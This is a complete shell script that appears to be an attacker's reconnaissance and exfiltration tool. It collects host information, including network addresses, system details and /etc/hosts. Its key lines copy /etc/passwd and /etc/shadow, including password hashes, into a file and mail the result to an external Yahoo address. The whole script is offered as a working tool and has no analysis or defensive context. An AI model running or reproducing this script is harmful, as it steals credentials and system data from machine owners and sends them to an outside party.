#!/bin/sh
########

echo "***" >> info2
echo "uname -a ..."
uname -a >> info2
echo "***" >> info2
echo >> info2
echo "*** Inet Info" >> info2 
echo "ifconfig -a ..."
/sbin/ifconfig | grep inet >> info2
echo "***" >> info2
echo >> info2
echo "*** Uptime Info" >> info2
echo "uptime ..."
uptime >> info2
echo "***" >> info2
echo >> info2 
echo "*** CPU Info" >> info2
cat /proc/cpuinfo >> info2 
echo "***" >> info2
echo >> info2
echo "*** Passwd file" >> info2
echo "passwd ..."
cat /etc/passwd >> info2
echo "***" >> info2
echo >> info2
echo "*** Shadow file -if any-" >> info2
echo "shadow ..."
cat /etc/shadow >> info2 
echo "***" >> info2
echo >> info2
echo "*** Hard disk free ..." >> info2
echo "hard disk ..."
df -h >> info2
echo "*** System memory ..." >> info2
echo "memory ..."
free >> info2
echo "*** Ping statistics to Yahoo" >> info2
echo "yahoo pings ..."
ping -c 2 216.115.108.245 >> info2
echo "***" >> info2
echo >> info2
echo " *** hosts ... *** " >> info2
cat /etc/hosts >> info2
sleep 5
echo "Done! Mailing results ... Please wait ..."
cat info2 | mail -s "$(uname -a)" sc0rpi0n16@yahoo.com
sleep 5
